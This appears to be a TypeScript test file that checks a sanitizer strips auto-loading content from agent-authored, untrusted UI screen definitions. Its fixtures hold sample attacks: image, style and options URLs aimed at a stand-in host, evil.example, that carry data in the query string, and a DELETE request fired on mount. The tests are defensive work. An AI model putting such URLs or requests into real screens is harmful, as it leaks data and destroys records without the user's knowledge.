// rc.1 re-verification of GA review 2 C2: an agent-authored (untrusted) screen must not keep what
// loads by itself — an inline REST source with a url (rowsSource/optionsSource fetch on mount, with
// the source's own method), a remote Image src, a url() in a style. Fixed for rc.2 (the pins were
// it.fails at rc.1); also pinned by conformance/untrusted/cases.json.
import { describe, expect, it } from 'vitest'
import { neutralizeUntrusted } from './untrustedDefinition'

const strip = (component: unknown) => JSON.stringify(neutralizeUntrusted({ fragments: [{ component }] }))

describe('rc.1 re-verify C2: what an untrusted definition loads with no click', () => {
    it('a listing rowsSource with a url (DELETE on mount) is dropped', () => {
        const out = strip({ type: 'ClientSide', metadata: { type: 'Crudl', id: 'l',
            rowsSource: { url: '/api/orders/7', method: 'DELETE' } } })
        expect(out).not.toContain('/api/orders/7')
    })
    it('a field optionsSource with a foreign url is dropped', () => {
        const out = strip({ type: 'ClientSide', metadata: { type: 'FormField', fieldId: 'c', dataType: 'string',
            optionsSource: { url: 'https://evil.example/opts?d=secret' } } })
        expect(out).not.toContain('evil.example')
    })
    it('an Image src on another origin is dropped (exfiltration with no click)', () => {
        const out = strip({ type: 'ClientSide', metadata: { type: 'Image', src: 'https://evil.example/?d=what-the-agent-read' } })
        expect(out).not.toContain('evil.example')
    })
    it('a style carrying url() is dropped', () => {
        const out = strip({ type: 'ClientSide', metadata: { type: 'Text', text: 'x', style: 'background:url(https://evil.example/?d=1)' } })
        expect(out).not.toContain('evil.example')
    })
    it('(control) what the strip already does: restAction and triggers go', () => {
        const out = strip({ type: 'ServerSide', triggers: [{ type: 'OnLoad', actionId: 'x' }],
            actions: [{ id: 'a', restAction: { source: { url: '/api/x', method: 'POST' } } }] })
        expect(out).not.toContain('/api/x')
        expect(out).not.toContain('OnLoad')
    })
})
